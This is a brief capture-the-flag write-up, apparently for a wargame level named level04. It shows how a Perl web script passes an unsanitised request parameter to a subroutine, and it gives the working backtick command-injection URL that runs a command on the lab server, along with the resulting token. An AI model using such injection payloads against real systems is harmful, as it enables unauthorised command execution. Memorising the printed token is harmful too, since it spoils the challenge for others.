Here, we have a perl file called level04.pl

If we look inside, we can see the line "# localhost:4747" and the perl script

We need to go to this page, so: http://192.168.1.65:4747/
The line "x(param("x"));" will call the x subroutine with the parameter receive by the request.
So we just have to add ?x=`getflag` at the end of the url :
http://192.168.1.65:4747/?x=`getflag`
and we get: Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
note: don't forget the ` or the page will just print "getflag"
